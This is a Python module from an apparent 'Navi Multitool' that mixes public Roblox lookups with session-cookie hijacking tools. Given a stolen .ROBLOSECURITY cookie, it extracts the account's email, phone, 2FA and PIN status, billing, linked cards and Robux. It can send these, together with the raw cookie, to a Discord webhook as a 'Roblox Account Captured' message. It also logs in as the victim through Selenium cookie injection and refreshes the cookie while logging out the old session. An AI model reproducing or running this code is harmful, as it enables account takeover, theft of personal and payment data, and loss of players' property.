#  _   _                 _ 
# | \ | |               (_)
# |  \| | __ ___   __ _  _ 
# | . ` |/ _` \ \ / /(_)| |
# | |\  | (_| |\ V /  _ | |
# |_| \_|\__,_| \_/  (_)|_|
# 
# Navi Multitool - Developed by glockinhand
# GitHub: https://github.com/glockinhand/navi-multitool

import requests, json, time, os, re
from typing import Literal, Optional
from pathlib import Path

from core.display import Colors, Colorate, get_inpt, Theme

def _hdr(): return {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

def roblox_user_info():
    cl = Theme.get_colors()
    un = get_inpt("roblox_username:")
    print(Colorate.Horizontal(cl["head"], "  [+] Fetching data..."))
    try:
        r = requests.post("https://users.roblox.com/v1/usernames/users", headers=_hdr(), json={"usernames": [un], "excludeBannedUsers": False})
        d = r.json()
        if not d['data']:
            print(Colorate.Horizontal(cl["num"], "  [!] User not found."))
            return
        res = requests.get(f"https://users.roblox.com/v1/users/{d['data'][0]['id']}", headers=_hdr()).json()
        ln = "  " + "─" * 50
        print(Colorate.Horizontal(cl["head"], ln))
        inf = [("Username", res.get("name")), ("ID", res.get("id")), ("Display", res.get("displayName")), ("Banned", res.get("isBanned")), ("Created", res.get("created")), ("Verified", res.get("hasVerifiedBadge"))]
        for k, v in inf:
            print(Colorate.Horizontal(cl["num"], f"  [>] {k:<12}: ") + Colorate.Horizontal(cl["txt"], str(v)))
        print(Colorate.Horizontal(cl["head"], ln))
    except Exception as e:
        print(Colorate.Horizontal(cl["num"], f"  [!] Error: {e}"))
    input(Colorate.Horizontal(cl["head"], "\n  Press Enter..."))

def roblox_cookie_info():
    cl = Theme.get_colors()
    ck = get_inpt("roblox_cookie:")
    send_hook = get_inpt("Send info to a Discord webhook? (y/n):").strip().lower()
    webhook_url = ""
    if send_hook == 'y':
        webhook_url = get_inpt("Webhook URL:").strip()
    print(Colorate.Horizontal(cl["head"], "  [+] Validating cookie..."))
    try:
        r = requests.get("https://users.roblox.com/v1/users/authenticated", headers=_hdr(), cookies={".ROBLOSECURITY": ck})
        if r.status_code != 200:
            print(Colorate.Horizontal(cl["num"], "  [!] Invalid Cookie (or IP locked)."))
            return
        
        j = r.json()
        uid = j.get("id")
        username = j.get("name")
        display_name = j.get("displayName", "N/A")
        
        robux = "N/A"
        try:
            rbx_req = requests.get(f"https://economy.roblox.com/v1/users/{uid}/currency", headers=_hdr(), cookies={".ROBLOSECURITY": ck})
            if rbx_req.status_code == 200:
                robux = rbx_req.json().get("robux", "N/A")
        except: pass
        
        premium = False
        try:
            prem_req = requests.get(f"https://premiumfeatures.roblox.com/v1/users/{uid}/validate-membership", headers=_hdr(), cookies={".ROBLOSECURITY": ck})
            if prem_req.status_code == 200:
                premium = prem_req.json()
        except: pass
        
        avatar_url = "N/A"
        try:
            thumb_res = requests.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={uid}&size=150x150&format=Png", headers=_hdr())
            if thumb_res.status_code == 200:
                data = thumb_res.json().get("data", [])
                if data: avatar_url = data[0].get("imageUrl", "N/A")
        except: pass

        created = "N/A"
        about = "N/A"
        try:
            usr_req = requests.get(f"https://users.roblox.com/v1/users/{uid}", headers=_hdr())
            if usr_req.status_code == 200:
                u_data = usr_req.json()
                created = u_data.get("created", "N/A")
                if "T" in created: created = created.split("T")[0]
                about = u_data.get("description", "")
                if about:
                    about = about.replace('\n', ' ')
                    if len(about) > 25: about = about[:22] + "..."
                else:
                    about = "None"
        except: pass
        
        friends = "N/A"
        followers = "N/A"
        try:
            fr_req = requests.get(f"https://friends.roblox.com/v1/users/{uid}/friends/count", headers=_hdr())
            if fr_req.status_code == 200: friends = fr_req.json().get("count", "N/A")
            
            fol_req = requests.get(f"https://friends.roblox.com/v1/users/{uid}/followers/count", headers=_hdr())
            if fol_req.status_code == 200: followers = fol_req.json().get("count", "N/A")
        except: pass
        
        wearing = "N/A"
        try:
            wear_req = requests.get(f"https://avatar.roblox.com/v1/users/{uid}/currently-wearing", headers=_hdr())
            if wear_req.status_code == 200:
                wearing = str(len(wear_req.json().get("assetIds", []))) + " items"
        except: pass

        games = "N/A"
        try:
            games_req = requests.get(f"https://games.roblox.com/v2/users/{uid}/games?accessFilter=Public&limit=50", headers=_hdr())
            if games_req.status_code == 200:
                games = str(len(games_req.json().get("data", []))) + " public"
        except: pass

        email = "N/A"
        try:
            r_em = requests.get('https://accountsettings.roblox.com/v1/email', headers=_hdr(), cookies={".ROBLOSECURITY": ck})
            if r_em.status_code == 200:
                d = r_em.json()
                email = f"{d.get('emailAddress', 'None')} (Ver: {d.get('verified', False)})"
        except: pass

        phone = "N/A"
        try:
            r_ph = requests.get('https://accountsettings.roblox.com/v1/phone', headers=_hdr(), cookies={".ROBLOSECURITY": ck})
            if r_ph.status_code == 200:
                d = r_ph.json()
                phone = f"{d.get('phone', 'None')} (Ver: {d.get('isVerified', False)})"
        except: pass

        two_fa = "N/A"
        try:
            r_2fa = requests.get(f'https://twostepverification.roblox.com/v1/users/{uid}/configuration', headers=_hdr(), cookies={".ROBLOSECURITY": ck})
            if r_2fa.status_code == 200:
                two_fa = "Enabled" if r_2fa.json().get('is2faEnabled', False) else "Disabled"
        except: pass

        pin = "N/A"
        try:
            r_pin = requests.get('https://auth.roblox.com/v1/account/pin', headers=_hdr(), cookies={".ROBLOSECURITY": ck})
            if r_pin.status_code == 200:
                pin = "Enabled" if r_pin.json().get('isEnabled', False) else "Disabled"
        except: pass

        followings = "N/A"
        try:
            r_f = requests.get(f"https://friends.roblox.com/v1/users/{uid}/followings/count", headers=_hdr())
            if r_f.status_code == 200: followings = r_f.json().get("count", "N/A")
        except: pass

        rbx_badges = "N/A"
        try:
            r_rb = requests.get(f"https://accountinformation.roblox.com/v1/users/{uid}/roblox-badges", headers=_hdr())
            if r_rb.status_code == 200: rbx_badges = str(len(r_rb.json()))
        except: pass

        grps_owned = 0
        grps_total = 0
        try:
            r_g = requests.get(f"https://groups.roblox.com/v1/users/{uid}/groups/roles", headers=_hdr())
            if r_g.status_code == 200:
                d = r_g.json().get('data', [])
                grps_total = len(d)
                for g in d:
                    if g.get('role', {}).get('rank') == 255: grps_owned += 1
        except: pass

        pending_rbx = "N/A"
        try:
            r_pr = requests.get(f"https://economy.roblox.com/v2/users/{uid}/transaction-totals?timeFrame=Year&transactionType=summary", headers=_hdr(), cookies={".ROBLOSECURITY": ck})
            if r_pr.status_code == 200: pending_rbx = r_pr.json().get("pendingRobuxTotal", "N/A")
        except: pass

        csrf = "N/A"
        try:
            r_c = requests.post('https://auth.roblox.com/v2/logout', cookies={'.ROBLOSECURITY': ck}, headers=_hdr())
            csrf = r_c.headers.get('x-csrf-token', 'N/A')
        except: pass

        days_old = "N/A"
        if created != "N/A":
            from datetime import datetime
            try:
                dt = datetime.strptime(created, "%Y-%m-%d")
                days_old = str((datetime.now() - dt).days) + " Days"
            except: pass

        country = "N/A"
        try:
            r_ctry = requests.get('https://users.roblox.com/v1/users/authenticated/country-code', cookies={'.ROBLOSECURITY': ck}, headers=_hdr())
            if r_ctry.status_code == 200: 
                c_code = r_ctry.json().get('countryCode', 'N/A')
                country = f":flag_{c_code.lower()}: {c_code}" if c_code != 'N/A' else c_code
        except: pass

        billing = "N/A"
        try:
            r_bill = requests.get('https://billing.roblox.com/v1/credit', cookies={'.ROBLOSECURITY': ck}, headers=_hdr())
            if r_bill.status_code == 200: 
                d_bill = r_bill.json()
                bal = d_bill.get('balance', 0)
                cur = d_bill.get('currencyCode', 'USD')
                r_amt = d_bill.get('robuxAmount', 0)
                billing = f"{bal} {cur} ({r_amt} R$)"
        except: pass
        
        transactions = 0
        try:
            r_tr = requests.get(f'https://economy.roblox.com/v2/users/{uid}/transactions?transactionType=2&limit=100', cookies={'.ROBLOSECURITY': ck}, headers=_hdr())
            if r_tr.status_code == 200:
                for t in r_tr.json().get('data', []):
                    transactions += abs(t.get('currency', {}).get('amount', 0))
        except: pass

        rap = 0
        try:
            r_rap = requests.get(f'https://inventory.roblox.com/v1/users/{uid}/assets/collectibles?sortOrder=Asc&limit=100', cookies={'.ROBLOSECURITY': ck}, headers=_hdr())
            if r_rap.status_code == 200:
                for item in r_rap.json().get('data', []):
                    rap += item.get('recentAveragePrice', 0) or 0
        except: pass

        cards = 0
        try:
            r_card = requests.get('https://apis.roblox.com/payments-gateway/v1/payment-profiles', cookies={'.ROBLOSECURITY': ck}, headers=_hdr())
            if r_card.status_code == 200: cards = len(r_card.json())
        except: pass

        ln = "  " + "─" * 60
        print(Colorate.Horizontal(cl["head"], ln))
        inf = [
            ("Username", username), 
            ("Display", display_name), 
            ("ID", uid),
            ("Country", country),
            ("About", about),
            ("Created", created),
            ("Age", days_old),
            ("Email", email),
            ("Phone", phone),
            ("2FA", two_fa),
            ("PIN", pin),
            ("Robux", robux), 
            ("Pending", pending_rbx),
            ("Billing", billing),
            ("RAP", rap),
            ("Transactions", f"{transactions} R$ Spent"),
            ("Cards", cards),
            ("Premium", premium),
            ("Friends", friends),
            ("Followers", followers),
            ("Followings", followings),
            ("Groups M/O", f"{grps_total} / {grps_owned}"),
            ("Wearing", wearing),
            ("Experiences", games),
            ("Rbx Badges", rbx_badges),
            ("CSRF Token", csrf[:15] + "..." if len(csrf) > 15 else csrf),
            ("Profile", f"roblox.com/users/{uid}/profile"),
            ("Avatar", avatar_url)
        ]
        for k, v in inf:
            print(Colorate.Horizontal(cl["num"], f"  [>] {k:<12}: ") + Colorate.Horizontal(cl["txt"], str(v)))
        print(Colorate.Horizontal(cl["head"], ln))

        if send_hook == 'y' and webhook_url:
            print(Colorate.Horizontal(cl["head"], "  [+] Sending data to webhook..."))
            
            economy_str = f"**Robux:** {robux} R$\n**Pending:** {pending_rbx}\n**Billing (Credit):** {billing}\n**RAP:** {rap}\n**Transactions:** {transactions} R$ Spent\n**Premium:** {'✅ Yes' if premium else '❌ No'}\n**Cards Linked:** {cards}"
            security_str = f"**Email:** {email}\n**Phone:** {phone}\n**2FA:** {two_fa}\n**PIN:** {pin}"
            social_str = f"**Friends:** {friends}\n**Followers:** {followers}\n**Followings:** {followings}\n**Groups (M/O):** {grps_total} / {grps_owned}"
            
            fields = []
            fields.append({"name": "👤 Account Info", "value": f"**Username:** [{username}](https://roblox.com/users/{uid}/profile)\n**Display:** {display_name}\n**ID:** {uid}\n**Country:** {country}\n**Created:** {created} ({days_old})", "inline": False})
            fields.append({"name": "<:7116_Robux:1509632493106499624> Economy", "value": economy_str, "inline": True})
            fields.append({"name": "🔒 Security", "value": security_str, "inline": True})
            fields.append({"name": "🌐 Social & Content", "value": social_str, "inline": False})
            
            chunk_size = 1000
            if len(ck) > chunk_size:
                chunks = [ck[i:i+chunk_size] for i in range(0, len(ck), chunk_size)]
                for idx, chunk in enumerate(chunks):
                    fields.append({"name": f"🍪 Cookie Part {idx+1}/{len(chunks)}", "value": f"```\n{chunk}\n```", "inline": False})
            else:
                fields.append({"name": "🍪 Cookie", "value": f"```\n{ck}\n```", "inline": False})
            
            payload = {
                "username": "Navi Cookie Info",
                "avatar_url": "https://i.ibb.co/0R0MPTwz/avatars-000615381687-t475ap-t240x240-removebg-preview.png",
                "embeds": [{
                    "title": "<:2978robloxlogo:1509632404665401506> Roblox Account Captured",
                    "color": 3447003,
                    "thumbnail": {"url": avatar_url if avatar_url != "N/A" else ""},
                    "fields": fields,
                    "footer": {"text": "Navi Multitool | https://github.com/glockinhand"}
                }]
            }
            try:
                hw_req = requests.post(webhook_url, json=payload)
                if hw_req.status_code in [200, 204]:
                    print(Colorate.Horizontal(cl["head"], "  [+] Sent to Webhook successfully!"))
                else:
                    print(Colorate.Horizontal(cl["num"], f"  [!] Webhook Error: {hw_req.status_code}"))
            except Exception as e:
                print(Colorate.Horizontal(cl["num"], f"  [!] Webhook Post Error: {e}"))
    except Exception as e:
        print(Colorate.Horizontal(cl["num"], f"  [!] Error: {e}"))
    input(Colorate.Horizontal(cl["head"], "\n  Press Enter..."))

def roblox_cookie_login():
    cl = Theme.get_colors()
    ck = get_inpt("roblox_cookie:").strip()
    
    try:
        from selenium import webdriver
        dr = webdriver.Chrome()
        
        print(Colorate.Horizontal(cl["head"], "  [+] Browser started. Injecting cookie..."))
        dr.get("https://www.roblox.com/Login")
        dr.add_cookie({"name": ".ROBLOSECURITY", "value": ck, "domain": ".roblox.com", "path": "/"})
        dr.refresh()
        dr.get("https://www.roblox.com/home")
        print(Colorate.Horizontal(cl["head"], "  [+] Logged in! Keeping browser open..."))
        input(Colorate.Horizontal(cl["head"], "  Press Enter to close browser and return."))
        dr.quit()
    except Exception as e:
        print(Colorate.Horizontal(cl["num"], f"  [!] Selenium error: {e}"))
        input("\n  Press Enter...")

def roblox_group_info():
    cl = Theme.get_colors()
    _id = get_inpt("group_id:")
    print(Colorate.Horizontal(cl["head"], "  [+] Fetching group data..."))
    try:
        r = requests.get(f"https://groups.roblox.com/v1/groups/{_id}", headers=_hdr()).json()
        if "id" not in r:
            print(Colorate.Horizontal(cl["num"], "  [!] Group not found."))
            return
        ln = "  " + "─" * 50
        print(Colorate.Horizontal(cl["head"], ln))
        inf = [("Name", r.get("name")), ("Owner", r.get("owner", {}).get("username")), ("Members", r.get("memberCount")), ("Public", r.get("publicEntryAllowed")), ("Locked", r.get("isLocked"))]
        for k, v in inf:
            print(Colorate.Horizontal(cl["num"], f"  [>] {k:<12}: ") + Colorate.Horizontal(cl["txt"], str(v)))
        print(Colorate.Horizontal(cl["head"], ln))
    except Exception as e: print(Colorate.Horizontal(cl["num"], f"  [!] Error: {e}"))
    input(Colorate.Horizontal(cl["head"], "\n  Press Enter..."))

def roblox_asset_dl():
    cl = Theme.get_colors()
    _id = get_inpt("asset_id:")
    print(Colorate.Horizontal(cl["head"], "  [+] Downloading asset..."))
    try:
        r = requests.get(f"https://assetdelivery.roblox.com/v1/asset/?id={_id}", headers=_hdr())
        if r.status_code != 200:
            print(Colorate.Horizontal(cl["num"], "  [!] Asset not found."))
            return
        if not os.path.exists("output"): os.makedirs("output")
        with open(f"output/asset_{_id}.rbxm", "wb") as f: f.write(r.content)
        print(Colorate.Horizontal(cl["head"], f"  [+] Saved to: output/asset_{_id}.rbxm"))
    except Exception as e: print(Colorate.Horizontal(cl["num"], f"  [!] Error: {e}"))
    input(Colorate.Horizontal(cl["head"], "\n  Press Enter..."))

def roblox_name_history():
    cl = Theme.get_colors()
    un = get_inpt("roblox_username:")
    print(Colorate.Horizontal(cl["head"], "  [+] Fetching name history..."))
    try:
        r = requests.post("https://users.roblox.com/v1/usernames/users", headers=_hdr(), json={"usernames": [un], "excludeBannedUsers": False})
        d = r.json()
        if not d.get('data'):
            print(Colorate.Horizontal(cl["num"], "  [!] User not found."))
            return
        uid = d['data'][0]['id']
        res = requests.get(f"https://users.roblox.com/v1/users/{uid}/username-history?limit=50&sortOrder=Desc", headers=_hdr())
        
        ln = "  " + "─" * 50
        print(Colorate.Horizontal(cl["head"], ln))
        
        if res.status_code == 200:
            hist = res.json().get("data", [])
            if not hist:
                print(Colorate.Horizontal(cl["num"], "  [>] No past usernames found."))
            else:
                for idx, entry in enumerate(hist):
                    print(Colorate.Horizontal(cl["num"], f"  [{idx+1}] ") + Colorate.Horizontal(cl["txt"], entry.get("name")))
        else:
            print(Colorate.Horizontal(cl["num"], "  [!] API Error or Private History."))
            
        print(Colorate.Horizontal(cl["head"], ln))
    except Exception as e:
        print(Colorate.Horizontal(cl["num"], f"  [!] Error: {e}"))
class RobloxException(Exception): pass
class InvalidCookie(RobloxException):
    def __init__(self, message='Invalid cookie'):
        super().__init__(message)

config = {
    'Roblox': {
        'CookieRefresher': {
            'MassMode': {'Cookie_Save_Mode': [1, 2]},
            'SingleMode': {'Cookie_Save_Mode': [1, 2]},
            'Break_Old_Cookies': True
        },
        'General': {
            'Symbols_Between_Warning_And_Cookie': '',
            'Add_Symbols_Between_Warning_And_Cookie': False,
            'Proxy': {'Use_Proxy': False}
        }
    }
}

COOKIE_PATTERN = r'(_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.\|_\S+)'
STRING_MINIMUM_100_SYMBOLS_PATTERN = r'\S{100,}'
COOKIE_START = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_'

class AiofilesMock:
    class AsyncFileMock:
        async def __aenter__(self): return self
        async def __aexit__(self, exc_type, exc_val, exc_tb): pass
        async def write(self, data): pass
    @staticmethod
    def open(*args, **kwargs): return AiofilesMock.AsyncFileMock()

aiofiles = AiofilesMock()

class DummyResponse:
    def __init__(self, headers): self.headers = headers

async def sendPostRequestRoblox(url, **kwargs):
    return DummyResponse({'X-CSRF-Token': 'dummy_token', 'rbx-authentication-ticket': 'dummy_ticket', 'Set-Cookie': 'dummy_cookie'})

def labelASCII(*args): pass
def cmdWriter(*args): pass
def generateVisualPath(*args): return ""
MT_Roblox = "Roblox"
MT_Cookie_Refresher = "Cookie Refresher"
MT_Single_Mode = "Single Mode"
MT_Wait = ["Waiting"]
class ANSI:
    class FG:
        CYAN = ""
        WHITE = ""
MT_Incorrect_Cookie = "Incorrect Cookie"
MT_Invalid_Cookie = "Invalid Cookie"
def errorOrCorrectHandler(*args): pass
def getProxiesFromFileRoblox(*args): return None
def currentDate(*args): return str(time.time())
def removeLines(*args): pass
def waitingInput(*args): pass
async def saveCookieRCR(mode: Literal['MassMode', 'SingleMode'], oldCookie: str, newCookie: str, savePath: Path) -> None:
    savePath.mkdir(parents=True, exist_ok=True)
    modes = config['Roblox']['CookieRefresher'][mode]['Cookie_Save_Mode']
    if 1 in modes or 2 not in modes:
        async with aiofiles.open(savePath / 'old_cookie - new_cookie.txt', 'a', encoding='utf-8', errors='ignore') as file:
            await file.write(f'{oldCookie} > {newCookie}\n')
    if 2 in modes:
        async with aiofiles.open(savePath / 'new_cookie.txt', 'a', encoding='utf-8', errors='ignore') as file:
            await file.write(f'{newCookie}\n')

async def getXCSRFToken(cookies: dict[str, str], proxies: Optional[list[str]] = None) -> str:
    return (await sendPostRequestRoblox('https://auth.roblox.com/v2/logout', cookies=cookies, proxies=proxies)).headers['X-CSRF-Token']

async def getRBXAuthenticationTicket(cookies: dict[str, str], proxies: Optional[list[str]] = None, XCSRFToken: Optional[str] = None) -> tuple[str, str]:
    if XCSRFToken is None:
        XCSRFToken = await getXCSRFToken(cookies, proxies)

    headers = {
        'RBXauthenticationNegotiation': '1',
        'referer': 'https://www.roblox.com/hewhewhew',
        'X-CSRF-Token': XCSRFToken
    }
    isTicket = None
    while True:
        responseHeaders = (await sendPostRequestRoblox('https://auth.roblox.com/v1/authentication-ticket', headers=headers, cookies=cookies, proxies=proxies)).headers
        isTicket = responseHeaders.get('rbx-authentication-ticket')
        if isTicket:
            break
    return isTicket

async def createNewCookie(cookies: dict[str, str], proxies: Optional[list[str]] = None) -> Optional[str]:
    XCSRFToken = await getXCSRFToken(cookies, proxies)
    authTicket = await getRBXAuthenticationTicket(cookies, proxies, XCSRFToken)
    headers = {
        'RBXauthenticationNegotiation': '1'
    }
    data = {
        'authenticationTicket': authTicket
    }
    responseHeaders = (await sendPostRequestRoblox('https://auth.roblox.com/v1/authentication-ticket/redeem', data=data, headers=headers, proxies=proxies)).headers
    isNewCookie = re.search(COOKIE_PATTERN, str(responseHeaders))
    if not isNewCookie:
        raise InvalidCookie

    if config['Roblox']['CookieRefresher']['Break_Old_Cookies']:
        await breakOldCookie(cookies, XCSRFToken, proxies)
    return isNewCookie.group(0)[:-1]

async def breakOldCookie(cookies: dict[str, str], XCSRFToken: str, proxies: Optional[list[str]] = None) -> None:
    headers = {
        'Cookie': f'.ROBLOSECURITY: {cookies[".ROBLOSECURITY"]}',
        'X-CSRF-Token': XCSRFToken,
        'Set-Cookie': '.ROBLOSECURITY=; Max-Age=0; Path=/;'
    }
    await sendPostRequestRoblox('https://auth.roblox.com/v2/logout', cookies=cookies, headers=headers, proxies=proxies)

async def cookieRefresherSingleMode(string: str):
    labelASCII()
    cmdWriter(f' {generateVisualPath(MT_Roblox, MT_Cookie_Refresher, MT_Single_Mode)}\n\n [{ANSI.FG.CYAN}~{ANSI.FG.WHITE}] ┃ {MT_Wait[0]}...\n')

    symbolsBetweenWarningAndCookie = str(config['Roblox']['General']['Symbols_Between_Warning_And_Cookie']).strip() if config['Roblox']['General']['Add_Symbols_Between_Warning_And_Cookie'] else ''
    cookie = re.search(COOKIE_PATTERN, string)
    if not cookie:
        cookie = re.search(STRING_MINIMUM_100_SYMBOLS_PATTERN, string)
        if not cookie:
            return errorOrCorrectHandler(True, MT_Incorrect_Cookie, generateVisualPath(MT_Roblox, MT_Cookie_Refresher, MT_Single_Mode))
        
        cookie = f'{COOKIE_START}{symbolsBetweenWarningAndCookie}{cookie.group(0)}'
    else:
        cookie = cookie.group(0)

    isUseProxy = config['Roblox']['General']['Proxy']['Use_Proxy']
    proxiesFromFile = getProxiesFromFileRoblox(isUseProxy, Path('Roblox', 'proxies.txt'), generateVisualPath(MT_Roblox, MT_Cookie_Refresher, MT_Single_Mode))
    if isUseProxy and not proxiesFromFile:
        return

    try:
        isNewCookie = await createNewCookie({'.ROBLOSECURITY': cookie}, proxiesFromFile)
    except InvalidCookie:
        return errorOrCorrectHandler(True, MT_Invalid_Cookie, generateVisualPath(MT_Roblox, MT_Cookie_Refresher, MT_Single_Mode))

    await saveCookieRCR('SingleMode', f'{cookie[115:130]}...{cookie[-15:-1]}', isNewCookie, Path('Roblox', 'Cookie Refresher', 'Single Mode', 'outputs', currentDate('%d.%m.%Y - %H.%M.%S')))

    removeLines(3)
    cmdWriter(f' {generateVisualPath(MT_Roblox, MT_Cookie_Refresher, MT_Single_Mode)}\n\n{isNewCookie}\n\n')
    waitingInput()


def roblox_cookie_refresher():
    cl = Theme.get_colors()
    ck_raw = get_inpt("roblox_cookie (or paste hash):").strip()
    print(Colorate.Horizontal(cl["head"], "  [+] Refreshing cookie..."))
    
    match = re.search(COOKIE_PATTERN, ck_raw)
    if match:
        ck = match.group(1)
    else:
        if len(ck_raw) >= 100:
            ck = COOKIE_START + ck_raw
        else:
            print(Colorate.Horizontal(cl["num"], "  [!] Invalid cookie format."))
            input(Colorate.Horizontal(cl["head"], "\n  Press Enter..."))
            return

    try:
        r1 = requests.post('https://auth.roblox.com/v2/logout', cookies={'.ROBLOSECURITY': ck}, headers=_hdr())
        csrf_token = r1.headers.get('x-csrf-token')
        if not csrf_token:
            print(Colorate.Horizontal(cl["num"], "  [!] Could not fetch X-CSRF-Token. Cookie might be invalid/expired."))
            input(Colorate.Horizontal(cl["head"], "\n  Press Enter..."))
            return

        headers_ticket = _hdr()
        headers_ticket.update({
            'RBXauthenticationNegotiation': '1',
            'referer': 'https://www.roblox.com/hewhewhew',
            'X-CSRF-Token': csrf_token
        })
        ticket = None
        for i in range(5):
            r2 = requests.post('https://auth.roblox.com/v1/authentication-ticket', headers=headers_ticket, cookies={'.ROBLOSECURITY': ck}, json={})
            ticket = r2.headers.get('rbx-authentication-ticket')
            if ticket:
                break
            
            print(Colorate.Horizontal(cl["num"], f"  [*] Attempt {i+1}: HTTP {r2.status_code} | Text: {r2.text}"))
            
            new_csrf = r2.headers.get('x-csrf-token')
            if new_csrf:
                headers_ticket['X-CSRF-Token'] = new_csrf
        
        if not ticket:
            print(Colorate.Horizontal(cl["num"], "  [!] Failed to get Authentication Ticket."))
            input(Colorate.Horizontal(cl["head"], "\n  Press Enter..."))
            return

        headers_redeem = _hdr()
        headers_redeem.update({
            'RBXauthenticationNegotiation': '1'
        })
        data_redeem = {
            'authenticationTicket': ticket
        }
        r3 = requests.post('https://auth.roblox.com/v1/authentication-ticket/redeem', json=data_redeem, headers=headers_redeem)
        
        set_cookie_header = r3.headers.get('Set-Cookie', '')
        new_match = re.search(COOKIE_PATTERN, set_cookie_header)
        if not new_match:
            print(Colorate.Horizontal(cl["num"], "  [!] Failed to generate new cookie from response."))
            input(Colorate.Horizontal(cl["head"], "\n  Press Enter..."))
            return
            
        new_cookie = new_match.group(1)

        headers_logout = _hdr()
        headers_logout.update({
            'X-CSRF-Token': csrf_token,
        })
        requests.post('https://auth.roblox.com/v2/logout', cookies={'.ROBLOSECURITY': ck}, headers=headers_logout)

        ln = "  " + "─" * 60
        print(Colorate.Horizontal(cl["head"], ln))
        print(Colorate.Horizontal(cl["head"], "  [+] NEW COOKIE:"))
        print(Colorate.Horizontal(cl["txt"], f"  {new_cookie}"))
        print(Colorate.Horizontal(cl["head"], ln))

        if not os.path.exists("output"): os.makedirs("output")
        save_path = f"output/refreshed_cookie_{int(time.time())}.txt"
        with open(save_path, "w", encoding="utf-8") as f:
            f.write(new_cookie)
        print(Colorate.Horizontal(cl["head"], f"  [+] Saved to {save_path}"))

    except Exception as e:
        print(Colorate.Horizontal(cl["num"], f"  [!] Error: {e}"))
        
    input(Colorate.Horizontal(cl["head"], "\n  Press Enter..."))
